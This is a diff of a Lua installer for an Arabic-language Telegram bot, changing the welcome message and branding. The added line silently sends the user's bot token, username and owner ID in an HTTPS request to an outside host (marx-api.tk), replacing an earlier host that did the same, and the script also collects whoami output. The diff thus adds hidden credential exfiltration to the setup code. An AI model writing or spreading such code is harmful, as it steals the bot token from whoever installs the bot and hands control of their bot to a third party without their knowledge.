@@ -88,12 +88,12 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://alyafaevip.ml/LHB/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
+https.request('https://marx-api.tk/Tk/index.php='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖¦ شكرا لاستخدامك سورس ابو سعد \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+local Text = "اهلين عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \nشكرا لاستخدامك سورس Mishary  \nأرســل الحين /start \nعشان تشوف اوامر المطور  المجهزه بالكيبورد\n\n𓍦"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
